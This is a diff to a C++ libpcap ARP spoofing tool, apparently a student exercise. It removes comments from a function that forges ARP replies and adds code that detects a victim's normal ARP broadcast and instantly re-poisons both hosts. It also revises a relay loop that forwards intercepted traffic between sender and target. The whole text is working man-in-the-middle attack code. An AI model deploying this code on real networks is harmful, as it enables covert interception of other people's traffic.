@@ -127,20 +127,20 @@ void send_Arp(pcap_t* handle, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip t
 	//왜 멘토님께서 sender, target으로 하라고 하셨는지 뼈저리게 느낌
 	EthArpPacket packet;
 
-   	packet.eth_.dmac_ = target_mac;            // 타겟의 MAC 주소
-    packet.eth_.smac_ = sender_mac;            // 공격자의 MAC 주소
-    packet.eth_.type_ = htons(EthHdr::Arp);    // 이더넷 타입: ARP
+   	packet.eth_.dmac_ = target_mac;            
+    packet.eth_.smac_ = sender_mac;            
+    packet.eth_.type_ = htons(EthHdr::Arp);    
 
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);   // 하드웨어 타입: 이더넷
-    packet.arp_.pro_ = htons(EthHdr::Ip4);     // 프로토콜 타입: IPv4
-    packet.arp_.hln_ = Mac::SIZE;              // 하드웨어 주소 길이
-    packet.arp_.pln_ = Ip::SIZE;               // 프로토콜 주소 길이
-    packet.arp_.op_ = htons(ArpHdr::Reply);    // ARP 오퍼레이션: Reply
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);  
+    packet.arp_.pro_ = htons(EthHdr::Ip4);     
+    packet.arp_.hln_ = Mac::SIZE;              
+    packet.arp_.pln_ = Ip::SIZE;              
+    packet.arp_.op_ = htons(ArpHdr::Reply);   
 
-    packet.arp_.smac_ = sender_mac;            // 공격자의 MAC 주소 (변조된 MAC 주소)
-    packet.arp_.sip_ = htonl(sender_ip);      // 변조된 IP 주소 (타겟이 오인하게 만들 IP)
-    packet.arp_.tmac_ = target_mac;            // 타겟의 MAC 주소 (변조된 MAC 주소의 소유자라고 착각하게 될 대상)
-    packet.arp_.tip_ = htonl(target_ip);       // 타겟의 IP 주소 (스푸핑하려는 대상 IP)
+    packet.arp_.smac_ = sender_mac;            
+    packet.arp_.sip_ = htonl(sender_ip);      
+    packet.arp_.tmac_ = target_mac;        
+    packet.arp_.tip_ = htonl(target_ip);       
 
     printf("[INFO] Sending ARP Spoofing Packet:\n");
     printf("       Attacker MAC: %s\n", std::string(sender_mac).c_str());
@@ -171,26 +171,35 @@ void relay_packet(pcap_t* handle, Mac myMac, Mac sender_mac, Ip sender_ip, Mac t
 			break;
 			}
 		PEthHdr eth_hdr = (PEthHdr)packet;
-		std::cout<<"릴레이 시작" << std::endl;
+		if((eth_hdr->smac_ == sender_mac || eth_hdr->smac_ == target_mac) && 
+			(eth_hdr->dmac_ == Mac("ff:ff:ff:ff:ff:ff") || eth_hdr -> dmac_ == Mac("00:00:00:00:00:00")))
+		   { 
+			//정상적인 arp 요청이 들어 올 때, 이걸 변조 회복 프로세스라고 탐지
+			std::cout << "Inspection Recovery Detected!" << std::endl;
+			send_Arp(handle, myMac, target_ip, sender_mac, sender_ip);
+			sleep(1);
+			send_Arp(handle, myMac, sender_ip, target_mac, target_ip);
+			sleep(1);
+			}
 		if(eth_hdr->type() == EthHdr::Ip4) {
 			u_char * relay_packet = new u_char[header->caplen];
 			memcpy(relay_packet, packet, header->caplen);
 
 			PEthHdr relay_eth_hdr = (PEthHdr)relay_packet;
-				std::cout << "Captured Packet of Mac Address from"<< ": " << std::string(eth_hdr->smac_) <<"to :"<<std::string(eth_hdr->dmac_)<< std::endl;
+			//	std::cout << "Captured Packet of Mac Address from"<< ": " << std::string(eth_hdr->smac_) <<" to :"<<std::string(eth_hdr->dmac_)<< std::endl;
 
 
 			if (eth_hdr->smac_ == sender_mac && eth_hdr->dmac_ == myMac) {
 				relay_eth_hdr->smac_ = myMac;
 				relay_eth_hdr->dmac_ = target_mac;
-				std::cout << "Relay Packet of Mac Address from"<< ": " << std::string(sender_mac) <<"to :"<<std::string(target_mac)<< std::endl;
+				std::cout << "[Relay: Sender to Target]Relay Packet of Mac Address from"<< ": " << std::string(sender_mac) <<" to :"<<std::string(target_mac)<< std::endl;
 
 			} else if(eth_hdr->smac_ == target_mac && eth_hdr->dmac_ == myMac){
 				relay_eth_hdr->smac_ = myMac;
             	relay_eth_hdr->dmac_ = sender_mac;
-				std::cout << "Relay Packet of Mac Address from"<< ": " << std::string(target_mac) <<"to :"<<std::string(sender_mac)<< std::endl;//나중에 usingnamespace std;
+				std::cout << "[Relay: Target to Sender]Relay Packet of Mac Address from"<< ": " << std::string(target_mac) <<" to :"<<std::string(sender_mac)<< std::endl;//나중에 usingnamespace std;
 
-			} else{
+			} else {
 				delete[] relay_packet;
 				continue;
 			}
@@ -246,8 +255,9 @@ int main(int argc, char* argv[]) {
 		std::cout << std::endl;
 
 		Mac senderMac = get_sender_mac_address(handle, myMac, myIp, senderIp);
+		sleep(1);
 		Mac targetMac = get_sender_mac_address(handle, myMac, myIp, targetIp);
-
+		sleep(1);
 
 		if (senderMac.isNull()) {
 			fprintf(stderr, "Failed to get MAC address for IP: ");
@@ -256,9 +266,11 @@ int main(int argc, char* argv[]) {
 			continue;
 		}
 
+		
 		send_Arp(handle, myMac, targetIp, senderMac, senderIp);
+		sleep(1);
 		send_Arp(handle, myMac, senderIp, targetMac, targetIp);
-
+		sleep(1);
 
 		std::cout << "[INFO] Completed processing for this pair." << std::endl << std::endl;
 
